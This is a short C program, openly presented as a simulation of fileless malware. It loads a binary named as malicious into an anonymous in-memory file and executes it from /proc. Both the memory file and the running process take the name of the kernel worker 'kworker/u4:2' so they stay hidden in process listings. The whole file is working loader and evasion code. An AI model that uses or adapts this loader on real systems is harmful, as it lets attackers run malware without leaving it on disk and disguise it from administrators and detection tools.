#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <string.h>

/*
 * This technique simulates Fileless Malware / Process Ghosting.
 * It creates an anonymous file in memory (RAM), writes a binary payload to it,
 * and executes it without ever touching the disk.
 */

int main(int argc, char *argv[]) {
    if (argc != 2) {
        fprintf(stderr, "Uso: %s <ruta_al_binario_malicioso>\n", argv[0]);
        exit(1);
    }

    // 1. Create an anonymous file in RAM
    printf("[+] Creando archivo anónimo en memoria (memfd)...\n");
    int fd = memfd_create("kworker/u4:2", MFD_CLOEXEC); // Disguise the name
    if (fd == -1) {
        perror("memfd_create failed");
        exit(1);
    }

    // 2. Read the malicious binary from disk (in a real attack, this comes from the network)
    printf("[+] Leyendo el payload malicioso...\n");
    FILE *f = fopen(argv[1], "rb");
    if (!f) {
        perror("fopen failed");
        exit(1);
    }

    // 3. Write the binary into the memory file
    printf("[+] Escribiendo el payload en la memoria...\n");
    char buffer[4096];
    size_t bytes_read;
    while ((bytes_read = fread(buffer, 1, sizeof(buffer), f)) > 0) {
        write(fd, buffer, bytes_read);
    }
    fclose(f);

    // 4. Execute the binary from memory
    printf("[+] Ejecutando el payload desde memoria (Fileless)...\n");
    char fd_path[64];
    snprintf(fd_path, sizeof(fd_path), "/proc/self/fd/%d", fd);
    
    // The process replaces itself with the malicious payload
    execl(fd_path, "kworker/u4:2", NULL); // Disguise the process name in ps/htop
    
    perror("execl failed");
    return 1;
}
